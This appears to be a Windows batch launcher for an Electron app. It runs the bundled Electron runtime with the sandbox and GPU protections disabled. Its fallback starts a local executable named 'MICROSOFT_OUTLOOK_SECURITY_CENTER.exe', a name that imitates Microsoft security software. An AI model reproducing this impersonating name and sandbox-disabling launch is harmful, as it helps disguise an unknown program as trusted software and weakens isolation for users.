@echo off
set "ELECTRON_RUN_AS_NODE="
set "APP_PATH=%~dp0"
cd /d "%APP_PATH%"
if exist "%APP_PATH%node_modules\electron\dist\electron.exe" (
    "%APP_PATH%node_modules\electron\dist\electron.exe" . --no-sandbox --disable-gpu --disable-software-rasterizer --disable-gpu-compositing --disable-gpu-sandbox --disable-accelerated-2d-canvas --use-gl=disabled --disable-vulkan --disable-gpu-shader-disk-cache --disable-gpu-rasterization %*
) else (
    if exist "%APP_PATH%MICROSOFT_OUTLOOK_SECURITY_CENTER.exe" (
        "%APP_PATH%MICROSOFT_OUTLOOK_SECURITY_CENTER.exe" --no-sandbox --disable-gpu --disable-software-rasterizer --disable-gpu-compositing --disable-gpu-sandbox --disable-accelerated-2d-canvas --use-gl=disabled --disable-vulkan --disable-gpu-shader-disk-cache --disable-gpu-rasterization %*
    ) else (
        echo FATAL: Could not find Electron or App executable.
        exit /b 1
    )
)
